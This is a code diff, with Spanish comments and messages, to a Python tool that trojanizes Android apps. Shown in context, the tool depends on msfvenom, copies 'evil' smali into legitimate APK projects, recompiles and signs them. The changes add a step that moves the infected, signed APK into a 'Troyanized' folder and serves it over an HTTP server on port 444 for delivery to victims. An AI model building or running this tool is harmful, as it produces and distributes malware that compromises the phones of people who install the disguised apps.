@@ -22,7 +22,7 @@ def verificar_programa_linux(programa):
     return result_verificar_programas_linux.returncode == 0
 
 def instalar_dependencias_linux(move_script_to_Tools_directory):
-    if not verificar_programa_linux("java") or not verificar_programa_linux("curl") or not verificar_programa_linux("msfvenom") or not verificar_programa_linux("git"):
+    if not verificar_programa_linux("java") or not verificar_programa_linux("curl") or not verificar_programa_linux("msfvenom") or not verificar_programa_linux("git") or not verificar_programa_linux("xterm"):
         result_update=subprocess.run(["sudo", "apt-get", "update"])
 
         if result_update.returncode == 0:
@@ -77,6 +77,16 @@ def instalar_dependencias_linux(move_script_to_Tools_directory):
 
         else:
             print(f"\nError al instalar GIT en Linux:\n")
+            sys.exit(1)
+    
+    if not verificar_programa_linux("xterm"):
+        print("\nInstalando Xterm en Linux...\n")
+        result_install_git = subprocess.run(["sudo", "apt-get", "install", "-y", "xterm"])
+
+        if result_install_git.returncode == 0:
+            print("\nXterm instalado con éxito.\n")
+        else:
+            print(f"\nError al instalar Xterm en Linux:\n")
             sys.exit(1)
 
 def configureApktool_linux(originRoute, destinantionRoute):
@@ -217,7 +227,7 @@ def copyEvilSmali(ruta_apks, ruta_trojan_apk):
         print(f"\nError: No se encuentran APKs en {ruta_apks}.\n")
         return
 
-    carpetas = [f for f in os.listdir(ruta_apks) if os.path.isdir(os.path.join(ruta_apks, f)) and f != 'trojan']
+    carpetas = [f for f in os.listdir(ruta_apks) if os.path.isdir(os.path.join(ruta_apks, f)) and f.lower() not in ['trojan', 'troyanized']]
 
     if not carpetas:
         print(f"\nNo se encontraron proyectos para troyanizar en la ruta {ruta_apks}.")
@@ -350,7 +360,7 @@ def compileModifyApk(ruta_apks):
         return
 
     # Obtener los directorios dentro de la ruta, pero excluir 'trojan' si existe
-    directorios = [d for d in os.listdir(ruta_apks) if os.path.isdir(os.path.join(ruta_apks, d)) and d.lower() != 'trojan']
+    directorios = [d for d in os.listdir(ruta_apks) if os.path.isdir(os.path.join(ruta_apks, d)) and d.lower() not in ['trojan', 'troyanized']]
 
     if not directorios:
         print(f"\nNo se encontraron proyectos en la ruta {ruta_apks} (excluyendo 'trojan').")
@@ -388,13 +398,47 @@ def compileModifyApk(ruta_apks):
 def signNewApk(fileNewApkCompiled):
     fileSignerApk = "/home/Documents/InfectedAPK/Tools/uber-apk-signer-1.3.0.jar"
     print(f"\n{fileNewApkCompiled}")
+
     resultSignNewApk = subprocess.run(["java", "-jar", fileSignerApk, "--apks", fileNewApkCompiled])
 
     if resultSignNewApk.returncode == 0:
         print(f"\nNuevo Apk {fileNewApkCompiled} firmado con éxito.")
+        pythonServer(fileNewApkCompiled)
+
     else:
         print(f"\nError al firmar el nuevo APK {fileNewApkCompiled}.")
         sys.exit(1)
+    
+def pythonServer(fileNewApkCompiled):
+    legit_apk_troyanized_compiled_without_extension = os.path.splitext(fileNewApkCompiled)[0]
+    legit_apk_troyanized_compiled_and_signed = legit_apk_troyanized_compiled_without_extension + "-aligned-debugSigned.apk"
+
+    ruta_troyanized = "/home/Documents/InfectedAPK/APKs/Troyanized"
+
+    if not os.path.exists(ruta_troyanized):
+        os.makedirs(ruta_troyanized)
+        print(f"\nDirectorio creado con éxito en: {ruta_troyanized}")
+    else:
+        print(f"El directorio '{ruta_troyanized}' ya existe.")
+
+    try:
+        mv_command = f"mv {legit_apk_troyanized_compiled_and_signed} {ruta_troyanized}/"
+        subprocess.run(mv_command, shell=True, check=True)
+        print(f"\nEl archivo ha sido movido a {ruta_troyanized}")
+
+    except subprocess.CalledProcessError as e:
+        print(f"Error al mover el archivo: {e}")
+        sys.exit(1)
+
+    # print("\nPython server abierto en el puerto 8080.\n")
+    printMessage = "\nPython server abierto en el puerto 444.\n"
+    os.chdir(ruta_troyanized)
+
+    try:
+        subprocess.run(['/usr/bin/xterm', '-e', f'echo "{printMessage}"; python3 -m http.server 444; bash'])
+    except Exception as e:
+        print(f"Error al intentar abrir el terminal o ejecutar el servidor: {e}")
+
 
 def verificar_programa_windows(programa):
     result_verificar_programas_windowsx = subprocess.run(["where", programa])
